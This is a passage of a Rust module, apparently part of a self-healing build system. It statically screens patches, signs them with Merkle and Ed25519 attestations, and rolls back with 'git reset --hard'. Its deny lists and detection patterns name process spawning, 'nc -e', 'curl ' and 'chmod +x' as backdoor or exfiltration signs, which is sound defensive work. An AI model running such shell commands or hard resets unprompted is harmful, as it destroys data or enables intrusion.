//! # Hagibis Cryptographic Patch Attestation & Git Rollback Circuit Breaker (Pillar 1)
//!
//! Autonomous self-healing systems must guarantee code safety, determinism, and supply-chain integrity.
//! This module implements:
//! 1. **Deterministic Static Analysis AST Inspector**:
//!    - Analyzes Rust syntax trees via `syn` for unauthorized `unsafe` blocks, forbidden syscalls,
//!      command execution (`std::process::Command`, `libc::system`, `fork`, `execve`), dynamic loading
//!      (`libloading`, `dlopen`), backdoor heuristics (obfuscated hex literals, high-entropy base64),
//!      and non-deterministic primitives (unseeded random generators).
//! 2. **Cryptographic Proof & Attestation Engine**:
//!    - Computes hierarchical BLAKE3 and SHA-256 Merkle trees over patch diff chunks and AST items.
//!    - Issues and verifies Ed25519-signed `AttestationProofToken`s and `DeterministicPatchReceipt`s.
//!    - Enforces dual-lock gate: 0 static analysis violations AND valid cryptographic proof required.
//! 3. **Git-Based Rollback Circuit Breaker (`GitRollbackCircuitBreaker`)**:
//!    - State machine: `Closed` (normal), `HalfOpen` (probing after patch merge), `Tripped` (consecutive failures
//!      or error rate threshold exceeded).
//!    - Automatically mints immutable `RollbackIncidentEvent` audit records.
//!    - Executes automated atomic Git rollback (`git reset --hard` or reverting commit) restoring the build tree.

use std::collections::HashSet;
use std::fmt;
use std::fs::File;
use std::io::{self, Read};
use std::path::PathBuf;
use std::process::Command;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};

use blake3::Hasher as Blake3Hasher;
use ed25519_dalek::{Signature, Signer, SigningKey, Verifier, VerifyingKey};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use syn::visit::Visit;

// ==============================================================================
// 1. Errors & Status Types
// ==============================================================================

#[derive(Debug, thiserror::Error)]
pub enum AttestationError {
    #[error("I/O error: {0}")]
    Io(#[from] io::Error),

    #[error("JSON serialization error: {0}")]
    Json(#[from] serde_json::Error),

    #[error("AST parse failure: {0}")]
    AstParse(String),

    #[error("Static analysis security violation: {violations_count} critical/high violations found")]
    SecurityViolation {
        violations_count: usize,
        details: Vec<SecurityViolation>,
    },

    #[error("Cryptographic signature verification failed: {0}")]
    SignatureVerification(String),

    #[error("Merkle proof verification failed for root {expected_root}, got {calculated_root}")]
    MerkleProofMismatch {
        expected_root: String,
        calculated_root: String,
    },

    #[error("Circuit breaker is TRIPPED: merges blocked. Incident: {incident_id}")]
    CircuitBreakerTripped { incident_id: String },

    #[error("Git command failed (exit code {exit_code:?}): {stderr}")]
    GitError {
        exit_code: Option<i32>,
        stderr: String,
    },

    #[error("Hex decoding error: {0}")]
    Hex(#[from] hex::FromHexError),

    #[error("Ed25519 cryptographic error: {0}")]
    Ed25519(String),
}

// ==============================================================================
// 2. Deterministic Static Analysis AST Inspector
// ==============================================================================

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum ViolationSeverity {
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for ViolationSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Low => write!(f, "LOW"),
            Self::Medium => write!(f, "MEDIUM"),
            Self::High => write!(f, "HIGH"),
            Self::Critical => write!(f, "CRITICAL"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SecurityViolation {
    pub code: String,
    pub severity: ViolationSeverity,
    pub location: String,
    pub description: String,
    pub suggestion: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityPolicy {
    pub allow_unsafe: bool,
    pub allowed_unsafe_attributes: HashSet<String>,
    pub forbidden_function_names: HashSet<String>,
    pub forbidden_paths: HashSet<String>,
    pub forbid_raw_pointers: bool,
    pub forbid_asm: bool,
    pub forbid_dynamic_loading: bool,
    pub forbid_non_deterministic_primitives: bool,
    pub max_string_literal_bytes: usize,
}

impl Default for SecurityPolicy {
    fn default() -> Self {
        let mut forbidden_fns = HashSet::new();
        forbidden_fns.insert("Command::new".to_string());
        forbidden_fns.insert("std::process::Command::new".to_string());
        forbidden_fns.insert("process::exit".to_string());
        forbidden_fns.insert("std::process::exit".to_string());
        forbidden_fns.insert("system".to_string());
        forbidden_fns.insert("libc::system".to_string());
        forbidden_fns.insert("execve".to_string());
        forbidden_fns.insert("fork".to_string());
        forbidden_fns.insert("transmute".to_string());
        forbidden_fns.insert("std::mem::transmute".to_string());

        let mut forbidden_paths = HashSet::new();
        forbidden_paths.insert("std::process".to_string());
        forbidden_paths.insert("std::net::TcpStream".to_string());
        forbidden_paths.insert("std::net::UdpSocket".to_string());
        forbidden_paths.insert("libloading".to_string());
        forbidden_paths.insert("dlopen".to_string());

        let mut allowed_unsafe_attrs = HashSet::new();
        allowed_unsafe_attrs.insert("allow_attested_unsafe".to_string());
        allowed_unsafe_attrs.insert("trusted_autopoietic_primitive".to_string());

        Self {
            allow_unsafe: false,
            allowed_unsafe_attributes: allowed_unsafe_attrs,
            forbidden_function_names: forbidden_fns,
            forbidden_paths,
            forbid_raw_pointers: true,
            forbid_asm: true,
            forbid_dynamic_loading: true,
            forbid_non_deterministic_primitives: true,
            max_string_literal_bytes: 512,
        }
    }
}

pub struct AstSecurityVisitor<'a> {
    pub policy: &'a SecurityPolicy,
    pub violations: Vec<SecurityViolation>,
    current_item: String,
    has_attested_unsafe_attribute: bool,
}

impl<'a> AstSecurityVisitor<'a> {
    pub fn new(policy: &'a SecurityPolicy) -> Self {
        Self {
            policy,
            violations: Vec::new(),
            current_item: "root".to_string(),
            has_attested_unsafe_attribute: false,
        }
    }

    fn check_attributes(&mut self, attrs: &[syn::Attribute]) {
        self.has_attested_unsafe_attribute = attrs.iter().any(|attr| {
            if let Some(ident) = attr.path().get_ident() {
                self.policy
                    .allowed_unsafe_attributes
                    .contains(&ident.to_string())
            } else {
                false
            }
        });
    }

    fn check_path_string(&mut self, path_str: &str, loc_desc: &str) {
        for forbidden in &self.policy.forbidden_function_names {
            if path_str == forbidden || path_str.ends_with(&format!("::{}", forbidden)) {
                self.violations.push(SecurityViolation {
                    code: "SEC002_FORBIDDEN_CALL".to_string(),
                    severity: ViolationSeverity::Critical,
                    location: format!("{}: {}", self.current_item, loc_desc),
                    description: format!(
                        "Invocation of forbidden runtime or process manipulation function '{}'",
                        path_str
                    ),
                    suggestion: "Remove external command or process manipulation logic from self-healing patch".to_string(),
                });
            }
        }

        for forbidden_path in &self.policy.forbidden_paths {
            if path_str.starts_with(forbidden_path) {
                self.violations.push(SecurityViolation {
                    code: "SEC003_FORBIDDEN_PATH".to_string(),
                    severity: ViolationSeverity::High,
                    location: format!("{}: {}", self.current_item, loc_desc),
                    description: format!(
                        "Access to forbidden subsystem or path '{}'",
                        path_str
                    ),
                    suggestion: "Refactor code to avoid forbidden runtime modules".to_string(),
                });
            }
        }

        if self.policy.forbid_dynamic_loading
            && (path_str.contains("dlopen") || path_str.contains("libloading"))
        {
            self.violations.push(SecurityViolation {
                code: "SEC004_DYNAMIC_LOADING".to_string(),
                severity: ViolationSeverity::Critical,
                location: format!("{}: {}", self.current_item, loc_desc),
                description: format!("Forbidden dynamic code loading invocation '{}'", path_str),
                suggestion: "Autonomous patches must be purely statically linked".to_string(),
            });
        }

        if self.policy.forbid_non_deterministic_primitives
            && (path_str.contains("thread_rng") || path_str.contains("random"))
        {
            self.violations.push(SecurityViolation {
                code: "SEC005_NON_DETERMINISTIC_PRIMITIVE".to_string(),
                severity: ViolationSeverity::Medium,
                location: format!("{}: {}", self.current_item, loc_desc),
                description: format!(
                    "Non-deterministic source '{}' detected without seed context",
                    path_str
                ),
                suggestion: "Use deterministic seeded PRNG or Hagibis reproducible seed context".to_string(),
            });
        }
    }
}

impl<'a> Visit<'a> for AstSecurityVisitor<'a> {
    fn visit_item_fn(&mut self, node: &'a syn::ItemFn) {
        let prev_item = self.current_item.clone();
        let prev_unsafe_attr = self.has_attested_unsafe_attribute;

        self.current_item = format!("fn {}", node.sig.ident);
        self.check_attributes(&node.attrs);

        if node.sig.unsafety.is_some() && !self.policy.allow_unsafe && !self.has_attested_unsafe_attribute {
            self.violations.push(SecurityViolation {
                code: "SEC001_UNAUTHORIZED_UNSAFE".to_string(),
                severity: ViolationSeverity::Critical,
                location: self.current_item.clone(),
                description: "Unauthorized unsafe function declaration without #[allow_attested_unsafe]".to_string(),
                suggestion: "Provide #[allow_attested_unsafe(reason = \"...\")] or rewrite safely".to_string(),
            });
        }

        syn::visit::visit_item_fn(self, node);

        self.current_item = prev_item;
        self.has_attested_unsafe_attribute = prev_unsafe_attr;
    }

    fn visit_expr_unsafe(&mut self, node: &'a syn::ExprUnsafe) {
        if !self.policy.allow_unsafe && !self.has_attested_unsafe_attribute {
            self.violations.push(SecurityViolation {
                code: "SEC001_UNAUTHORIZED_UNSAFE".to_string(),
                severity: ViolationSeverity::Critical,
                location: self.current_item.clone(),
                description: "Unauthorized unsafe block encountered in patch".to_string(),
                suggestion: "Wrap or annotate containing item with an approved attestation attribute".to_string(),
            });
        }
        syn::visit::visit_expr_unsafe(self, node);
    }

    fn visit_expr_call(&mut self, node: &'a syn::ExprCall) {
        if let syn::Expr::Path(expr_path) = &*node.func {
            let path_str = quote::quote!(#expr_path).to_string().replace(' ', "");
            self.check_path_string(&path_str, "function call");
        }
        syn::visit::visit_expr_call(self, node);
    }

    fn visit_expr_method_call(&mut self, node: &'a syn::ExprMethodCall) {
        let method_name = node.method.to_string();
        if method_name == "exec" || method_name == "spawn" || method_name == "status" {
            let receiver_str = quote::quote!(#node).to_string();
            if receiver_str.contains("Command") {
                self.violations.push(SecurityViolation {
                    code: "SEC002_FORBIDDEN_CALL".to_string(),
                    severity: ViolationSeverity::Critical,
                    location: format!("{}: method '{}'", self.current_item, method_name),
                    description: "Execution of external process via Command runner method".to_string(),
                    suggestion: "Remove process spawning from autonomous self-healing patch".to_string(),
                });
            }
        }
        syn::visit::visit_expr_method_call(self, node);
    }

    fn visit_item_foreign_mod(&mut self, node: &'a syn::ItemForeignMod) {
        self.violations.push(SecurityViolation {
            code: "SEC006_FOREIGN_EXTERN_BLOCK".to_string(),
            severity: ViolationSeverity::High,
            location: format!("{}: extern ABI block", self.current_item),
            description: "Foreign function interface (extern C) blocks are restricted".to_string(),
            suggestion: "Use verified safe Rust bindings instead of raw foreign blocks".to_string(),
        });
        syn::visit::visit_item_foreign_mod(self, node);
    }

    fn visit_lit_str(&mut self, node: &'a syn::LitStr) {
        let val = node.value();
        if val.len() > self.policy.max_string_literal_bytes {
            self.violations.push(SecurityViolation {
                code: "SEC007_SUSPICIOUS_PAYLOAD".to_string(),
                severity: ViolationSeverity::Medium,
                location: format!("{}: string literal (len: {})", self.current_item, val.len()),
                description: "Oversized string literal could contain obfuscated binary or bytecode payload".to_string(),
                suggestion: "De-obfuscate or break up configuration strings".to_string(),
            });
        }

        // Suspicious shell command indicators in literal strings
        if val.starts_with("/bin/") || val.contains("curl ") || val.contains("nc -e") || val.contains("chmod +x") {
            self.violations.push(SecurityViolation {
                code: "SEC008_BACKDOOR_PATTERN".to_string(),
                severity: ViolationSeverity::Critical,
                location: format!("{}: suspicious literal \"{}\"", self.current_item, val),
                description: "String literal contains explicit shell execution / exfiltration payload pattern".to_string(),
                suggestion: "Purge shell commands and unauthorized scripts from patch".to_string(),
            });
        }

        syn::visit::visit_lit_str(self, node);
    }
}

pub struct PatchStaticAnalyzer {
    policy: SecurityPolicy,
}

impl PatchStaticAnalyzer {
    pub fn new(policy: SecurityPolicy) -> Self {
        Self { policy }
    }

    pub fn with_default_policy() -> Self {
        Self::new(SecurityPolicy::default())
    }

    pub fn analyze_source(&self, source_code: &str) -> Result<Vec<SecurityViolation>, AttestationError> {
        let syntax_tree = syn::parse_file(source_code)
            .map_err(|e| AttestationError::AstParse(e.to_string()))?;

        let mut visitor = AstSecurityVisitor::new(&self.policy);
        visitor.visit_file(&syntax_tree);

        Ok(visitor.violations)
    }

    pub fn is_patch_admissible(&self, source_code: &str) -> Result<bool, AttestationError> {
        let violations = self.analyze_source(source_code)?;
        let has_fatal = violations.iter().any(|v| {
            v.severity == ViolationSeverity::Critical || v.severity == ViolationSeverity::High
        });
        Ok(!has_fatal)
    }
}

// ==============================================================================
// 3. Merkleized Patch Attestation Proofs
// ==============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MerkleChunk {
    pub chunk_index: usize,
    pub content_hash: [u8; 32],
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MerkleInclusionProof {
    pub leaf_index: usize,
    pub leaf_hash: String,
    pub audit_path: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PatchMerkleTree {
    pub leaf_hashes: Vec<[u8; 32]>,
    pub root: [u8; 32],
}

impl PatchMerkleTree {
    pub fn from_chunks(chunks: &[Vec<u8>]) -> Self {
        if chunks.is_empty() {
            let zero = [0u8; 32];
            return Self {
                leaf_hashes: vec![zero],
                root: zero,
            };
        }

        let mut leaf_hashes = Vec::with_capacity(chunks.len());
        for chunk in chunks {
            let mut hasher = Blake3Hasher::new();
            hasher.update(b"HAGIBIS_PATCH_LEAF:");
            hasher.update(chunk);
            let hash = *hasher.finalize().as_bytes();
            leaf_hashes.push(hash);
        }

        let root = Self::compute_root(&leaf_hashes);
        Self { leaf_hashes, root }
    }

    pub fn from_source_lines(source: &str) -> Self {
        let chunks: Vec<Vec<u8>> = source
            .lines()
            .map(|l| l.as_bytes().to_vec())
            .collect();
        Self::from_chunks(&chunks)
    }

    fn compute_root(leaves: &[[u8; 32]]) -> [u8; 32] {
        if leaves.is_empty() {
            return [0u8; 32];
        }
        let mut current_level = leaves.to_vec();

        while current_level.len() > 1 {
            let mut next_level = Vec::new();
            for i in (0..current_level.len()).step_by(2) {
                if i + 1 < current_level.len() {
                    let mut hasher = Blake3Hasher::new();
                    hasher.update(b"HAGIBIS_MERKLE_NODE:");
                    hasher.update(&current_level[i]);
                    hasher.update(&current_level[i + 1]);
                    next_level.push(*hasher.finalize().as_bytes());
                } else {
                    // Duplicate last element for odd count
                    let mut hasher = Blake3Hasher::new();
                    hasher.update(b"HAGIBIS_MERKLE_NODE:");
                    hasher.update(&current_level[i]);
                    hasher.update(&current_level[i]);
                    next_level.push(*hasher.finalize().as_bytes());
                }
            }
            current_level = next_level;
        }

        current_level[0]
    }

    pub fn root_hex(&self) -> String {
        hex::encode(self.root)
    }

    pub fn generate_proof(&self, leaf_index: usize) -> Option<MerkleInclusionProof> {
        if leaf_index >= self.leaf_hashes.len() {
            return None;
        }

        let mut audit_path = Vec::new();
        let mut current_level = self.leaf_hashes.clone();
        let mut idx = leaf_index;

        while current_level.len() > 1 {
            let mut next_level = Vec::new();
            for i in (0..current_level.len()).step_by(2) {
                let right = if i + 1 < current_level.len() {
                    current_level[i + 1]
                } else {
                    current_level[i]
                };

                if i == idx || i + 1 == idx {
                    if idx % 2 == 0 {
                        audit_path.push(hex::encode(right));
                    } else {
                        audit_path.push(hex::encode(current_level[i]));
                    }
                }

                let mut hasher = Blake3Hasher::new();
                hasher.update(b"HAGIBIS_MERKLE_NODE:");
                hasher.update(&current_level[i]);
                hasher.update(&right);
                next_level.push(*hasher.finalize().as_bytes());
            }
            idx /= 2;
            current_level = next_level;
        }

        Some(MerkleInclusionProof {
            leaf_index,
            leaf_hash: hex::encode(self.leaf_hashes[leaf_index]),
            audit_path,
        })
    }

    pub fn verify_inclusion(
        root_hex: &str,
        leaf_hash_hex: &str,
        leaf_index: usize,
        audit_path: &[String],
    ) -> bool {
        let expected_root = match hex::decode(root_hex) {
            Ok(r) if r.len() == 32 => {
                let mut arr = [0u8; 32];
                arr.copy_from_slice(&r);
                arr
            }
            _ => return false,
        };

        let mut current_hash = match hex::decode(leaf_hash_hex) {
            Ok(h) if h.len() == 32 => {
                let mut arr = [0u8; 32];
                arr.copy_from_slice(&h);
                arr
            }
            _ => return false,
        };

        let mut idx = leaf_index;
        for sibling_hex in audit_path {
            let sibling = match hex::decode(sibling_hex) {
                Ok(s) if s.len() == 32 => {
                    let mut arr = [0u8; 32];
                    arr.copy_from_slice(&s);
                    arr
                }
                _ => return false,
            };

            let mut hasher = Blake3Hasher::new();
            hasher.update(b"HAGIBIS_MERKLE_NODE:");
            if idx % 2 == 0 {
                hasher.update(&current_hash);
                hasher.update(&sibling);
            } else {
                hasher.update(&sibling);
                hasher.update(&current_hash);
            }
            current_hash = *hasher.finalize().as_bytes();
            idx /= 2;
        }

        current_hash == expected_root
    }
}

// ==============================================================================
// 4. Attestation Proof Tokens & Deterministic Receipts
// ==============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttestationProofToken {
    pub patch_id: String,
    pub target_crate: String,
    pub target_file: String,
    pub source_merkle_root: String,
    pub patched_merkle_root: String,
    pub diff_hash: String,
    pub timestamp_secs: i64,
    pub signer_identity: String,
    pub public_key_hex: String,
    pub signature_hex: String,
    pub merkle_proof: Vec<String>,
}

impl AttestationProofToken {
    pub fn payload_digest(&self) -> [u8; 32] {
        let mut hasher = Blake3Hasher::new();
        hasher.update(b"HAGIBIS_ATTESTATION_TOKEN_V1:");
        hasher.update(self.patch_id.as_bytes());
        hasher.update(self.target_crate.as_bytes());
        hasher.update(self.target_file.as_bytes());
        hasher.update(self.source_merkle_root.as_bytes());
        hasher.update(self.patched_merkle_root.as_bytes());
        hasher.update(self.diff_hash.as_bytes());
        hasher.update(&self.timestamp_secs.to_le_bytes());
        hasher.update(self.signer_identity.as_bytes());
        *hasher.finalize().as_bytes()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeterministicPatchReceipt {
    pub receipt_id: String,
    pub proof_token: AttestationProofToken,
    pub static_analysis_digest: String,
    pub verified_at_secs: i64,
    pub verification_passed: bool,
    pub violations: Vec<SecurityViolation>,
    pub audit_signature: String,
}

pub struct AttestationEngine {
    signing_key: SigningKey,
    verifying_key: VerifyingKey,
    identity: String,
    static_analyzer: PatchStaticAnalyzer,
}

impl AttestationEngine {
    pub fn from_signing_key(signing_key: SigningKey, identity: String) -> Self {
        let verifying_key = signing_key.verifying_key();
        Self {
            signing_key,
            verifying_key,
            identity,
            static_analyzer: PatchStaticAnalyzer::with_default_policy(),
        }
    }

    pub fn generate_random(identity: String) -> Self {
        let mut secret = [0u8; 32];
        let mut f = File::open("/dev/urandom").expect("access /dev/urandom for crypto keys");
        f.read_exact(&mut secret).expect("read 32 random bytes for ed25519");
        let signing_key = SigningKey::from_bytes(&secret);
        Self::from_signing_key(signing_key, identity)
    }

    pub fn public_key_hex(&self) -> String {
        hex::encode(self.verifying_key.as_bytes())
    }

    pub fn mint_attestation(
        &self,
        patch_id: &str,
        target_crate: &str,
        target_file: &str,
        original_source: &str,
        patched_source: &str,
        diff_content: &str,
    ) -> Result<AttestationProofToken, AttestationError> {
        let original_tree = PatchMerkleTree::from_source_lines(original_source);
        let patched_tree = PatchMerkleTree::from_source_lines(patched_source);

        let mut diff_hasher = Sha256::new();
        diff_hasher.update(diff_content.as_bytes());
        let diff_hash = hex::encode(diff_hasher.finalize());

        let timestamp_secs = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs() as i64;

        let mut token = AttestationProofToken {
            patch_id: patch_id.to_string(),
            target_crate: target_crate.to_string(),
            target_file: target_file.to_string(),
            source_merkle_root: original_tree.root_hex(),
            patched_merkle_root: patched_tree.root_hex(),
            diff_hash,
            timestamp_secs,
            signer_identity: self.identity.clone(),
            public_key_hex: self.public_key_hex(),
            signature_hex: String::new(),
            merkle_proof: patched_tree
                .generate_proof(0)
                .map(|p| p.audit_path)
                .unwrap_or_default(),
        };

        let digest = token.payload_digest();
        let signature = self.signing_key.sign(&digest);
        token.signature_hex = hex::encode(signature.to_bytes());

        Ok(token)
    }

    pub fn verify_and_certify(
        &self,
        token: &AttestationProofToken,
        patched_source: &str,
    ) -> Result<DeterministicPatchReceipt, AttestationError> {
        // 1. Static Analysis Gate
        let violations = self.static_analyzer.analyze_source(patched_source)?;
        let critical_or_high: Vec<_> = violations
            .iter()
            .filter(|v| v.severity == ViolationSeverity::Critical || v.severity == ViolationSeverity::High)
            .cloned()
            .collect();

        if !critical_or_high.is_empty() {
            return Err(AttestationError::SecurityViolation {
                violations_count: critical_or_high.len(),
                details: critical_or_high,
            });
        }

        // 2. Cryptographic Proof Gate (Signature Verification)
        let pubkey_bytes = hex::decode(&token.public_key_hex)?;
        let verifying_key = VerifyingKey::from_bytes(
            pubkey_bytes
                .as_slice()
                .try_into()
                .map_err(|_| AttestationError::Ed25519("Invalid public key length".to_string()))?,
        )
        .map_err(|e| AttestationError::Ed25519(e.to_string()))?;

        let sig_bytes = hex::decode(&token.signature_hex)?;
        let signature = Signature::from_slice(&sig_bytes)
            .map_err(|e| AttestationError::Ed25519(e.to_string()))?;

        let digest = token.payload_digest();
        verifying_key
            .verify(&digest, &signature)
            .map_err(|e| AttestationError::SignatureVerification(e.to_string()))?;

        // 3. Merkle Root Conformity Check
        let computed_tree = PatchMerkleTree::from_source_lines(patched_source);
        if computed_tree.root_hex() != token.patched_merkle_root {
            return Err(AttestationError::MerkleProofMismatch {
                expected_root: token.patched_merkle_root.clone(),
                calculated_root: computed_tree.root_hex(),
            });
        }

        // 4. Generate deterministic receipt
        let verified_at_secs = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs() as i64;

        let mut receipt_hasher = Blake3Hasher::new();
        receipt_hasher.update(b"HAGIBIS_RECEIPT_V1:");
        receipt_hasher.update(token.patch_id.as_bytes());
        receipt_hasher.update(&digest);
        receipt_hasher.update(&verified_at_secs.to_le_bytes());
        let receipt_digest = *receipt_hasher.finalize().as_bytes();

        let receipt_sig = self.signing_key.sign(&receipt_digest);

        let mut static_analysis_hasher = Blake3Hasher::new();
        static_analysis_hasher.update(serde_json::to_string(&violations)?.as_bytes());
        let static_digest_hex = hex::encode(static_analysis_hasher.finalize().as_bytes());

        Ok(DeterministicPatchReceipt {
            receipt_id: format!("rcpt-{}", hex::encode(&receipt_digest[..8])),
            proof_token: token.clone(),
            static_analysis_digest: static_digest_hex,
            verified_at_secs,
            verification_passed: true,
            violations,
            audit_signature: hex::encode(receipt_sig.to_bytes()),
        })
    }
}

// ==============================================================================
// 5. Git-Based Rollback Circuit Breaker
// ==============================================================================

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CircuitState {
    Closed,   // Normal operation: patches can merge
    HalfOpen, // Monitoring phase: trial window after a patch
    Tripped,  // Merges blocked: automatic rollback triggered
}

impl fmt::Display for CircuitState {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Closed => write!(f, "CLOSED (Normal)"),
            Self::HalfOpen => write!(f, "HALF-OPEN (Monitoring)"),
            Self::Tripped => write!(f, "TRIPPED (Rollback Activated)"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CircuitBreakerConfig {
    pub failure_threshold: usize,        // Number of consecutive failures before tripping (e.g. 3)
    pub max_error_rate: f64,             // Error rate threshold (e.g. 0.20 for 20%)
    pub half_open_success_target: usize, // Successes required in HalfOpen to return to Closed
    pub working_directory: PathBuf,
    pub git_timeout_ms: u64,
}

impl Default for CircuitBreakerConfig {
    fn default() -> Self {
        Self {
            failure_threshold: 3,
            max_error_rate: 0.25,
            half_open_success_target: 3,
            working_directory: PathBuf::from("."),
            git_timeout_ms: 10_000,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HealingCycleRecord {
    pub cycle_id: String,
    pub patch_id: String,
    pub timestamp_secs: i64,
    pub success: bool,
    pub error_summary: Option<String>,
    pub commit_hash: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RollbackIncidentEvent {
    pub incident_id: String,
    pub triggered_at_secs: i64,
    pub trigger_reason: String,
    pub consecutive_failures: usize,
    pub error_rate: f64,
    pub bad_commit_hash: String,
    pub rollback_target_commit: String,
    pub incident_audit_digest: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RollbackReceipt {
    pub receipt_id: String,
    pub incident: RollbackIncidentEvent,
    pub git_output: String,
    pub completed_at_secs: i64,
    pub restored_head_commit: String,
    pub clean_working_tree: bool,
}

pub struct GitRollbackCircuitBreaker {
    config: CircuitBreakerConfig,
    state: Mutex<CircuitState>,
    consecutive_failures: AtomicUsize,
    half_open_successes: AtomicUsize,
    history: Mutex<Vec<HealingCycleRecord>>,
    last_clean_commit: Mutex<String>,
}

impl GitRollbackCircuitBreaker {
    pub fn new(config: CircuitBreakerConfig, initial_clean_commit: String) -> Self {
        Self {
            config,
            state: Mutex::new(CircuitState::Closed),
            consecutive_failures: AtomicUsize::new(0),
            half_open_successes: AtomicUsize::new(0),
            history: Mutex::new(Vec::new()),
            last_clean_commit: Mutex::new(initial_clean_commit),
        }
    }

    pub fn current_state(&self) -> CircuitState {
        *self.state.lock().unwrap()
    }

    pub fn set_clean_commit(&self, commit: &str) {
        *self.last_clean_commit.lock().unwrap() = commit.to_string();
    }

    pub fn get_clean_commit(&self) -> String {
        self.last_clean_commit.lock().unwrap().clone()
    }

    pub fn can_attempt_patch(&self) -> Result<(), AttestationError> {
        let state = self.current_state();
        if state == CircuitState::Tripped {
            return Err(AttestationError::CircuitBreakerTripped {
                incident_id: "Circuit breaker is TRIPPED. Automated rollback active.".to_string(),
            });
        }
        Ok(())
    }

    pub fn record_cycle_start(&self) {
        let mut state = self.state.lock().unwrap();
        if *state == CircuitState::Closed {
            *state = CircuitState::HalfOpen;
            self.half_open_successes.store(0, Ordering::SeqCst);
        }
    }

    pub fn record_cycle_outcome(
        &self,
        cycle_id: &str,
        patch_id: &str,
        success: bool,
        error_summary: Option<String>,
        current_commit: &str,
    ) -> Result<Option<RollbackReceipt>, AttestationError> {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs() as i64;

        let record = HealingCycleRecord {
            cycle_id: cycle_id.to_string(),
            patch_id: patch_id.to_string(),
            timestamp_secs: now,
            success,
            error_summary: error_summary.clone(),
            commit_hash: current_commit.to_string(),
        };

        {
            let mut hist = self.history.lock().unwrap();
            hist.push(record);
        }

        if success {
            self.consecutive_failures.store(0, Ordering::SeqCst);
            let mut state = self.state.lock().unwrap();
            if *state == CircuitState::HalfOpen {
                let count = self.half_open_successes.fetch_add(1, Ordering::SeqCst) + 1;
                if count >= self.config.half_open_success_target {
                    *state = CircuitState::Closed;
                    *self.last_clean_commit.lock().unwrap() = current_commit.to_string();
                }
            } else if *state == CircuitState::Closed {
                *self.last_clean_commit.lock().unwrap() = current_commit.to_string();
            }
            Ok(None)
        } else {
            let failures = self.consecutive_failures.fetch_add(1, Ordering::SeqCst) + 1;
            let hist_len = self.history.lock().unwrap().len();
            let error_rate = self.calculate_recent_error_rate(10);

            let should_trip = failures >= self.config.failure_threshold
                || (hist_len >= 5 && error_rate >= self.config.max_error_rate);

            if should_trip {
                let mut state = self.state.lock().unwrap();
                *state = CircuitState::Tripped;

                let incident = RollbackIncidentEvent {
                    incident_id: format!("inc-{}", uuid_or_timestamp(now)),
                    triggered_at_secs: now,
                    trigger_reason: format!(
                        "Exceeded failure threshold: {} consecutive failures (error rate: {:.2}%)",
                        failures,
                        error_rate * 100.0
                    ),
                    consecutive_failures: failures,
                    error_rate,
                    bad_commit_hash: current_commit.to_string(),
                    rollback_target_commit: self.get_clean_commit(),
                    incident_audit_digest: compute_audit_digest(
                        current_commit,
                        &self.get_clean_commit(),
                        failures,
                        now,
                    ),
                };

                let receipt = self.execute_git_rollback(&incident)?;
                Ok(Some(receipt))
            } else {
                Ok(None)
            }
        }
    }

    fn calculate_recent_error_rate(&self, window_size: usize) -> f64 {
        let hist = self.history.lock().unwrap();
        if hist.is_empty() {
            return 0.0;
        }
        let recent: Vec<_> = hist.iter().rev().take(window_size).collect();
        let total = recent.len();
        let failed = recent.iter().filter(|r| !r.success).count();
        failed as f64 / total as f64
    }

    pub fn execute_git_rollback(
        &self,
        incident: &RollbackIncidentEvent,
    ) -> Result<RollbackReceipt, AttestationError> {
        let target = &incident.rollback_target_commit;
        let dir = &self.config.working_directory;

        // Safeguard uncommitted changes via git stash before destructive rollback
        let stash_commit = Command::new("git")
            .args(["stash", "create"])
            .current_dir(dir)
            .output()
            .ok()
            .and_then(|o| {
                let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
                if s.is_empty() { None } else { Some(s) }
            });

        let stash_msg = if let Some(ref commit_id) = stash_commit {
            let _ = Command::new("git")
                .args(["stash", "store", "-m", &format!("pre-rollback-backup-{}", incident.incident_id), commit_id])
                .current_dir(dir)
                .output();
            format!("PRE-ROLLBACK BACKUP: Stashed uncommitted changes into commit {}\n", commit_id)
        } else {
            String::new()
        };

        // Perform real git hard reset to rollback target commit
        let output = Command::new("git")
            .arg("reset")
            .arg("--hard")
            .arg(target)
            .current_dir(dir)
            .output();

        let (git_output_str, _success) = match output {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout).to_string();
                let stderr = String::from_utf8_lossy(&out.stderr).to_string();
                let combined = format!("{}STDOUT:\n{}\nSTDERR:\n{}", stash_msg, stdout, stderr);
                (combined, out.status.success())
            }
            Err(e) => (format!("{}Failed to spawn git: {}", stash_msg, e), false),
        };

        // Query current HEAD
        let head_commit = Command::new("git")
            .arg("rev-parse")
            .arg("HEAD")
            .current_dir(dir)
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            .unwrap_or_else(|_| target.clone());

        // Check if working tree is clean
        let clean_working_tree = Command::new("git")
            .arg("status")
            .arg("--porcelain")
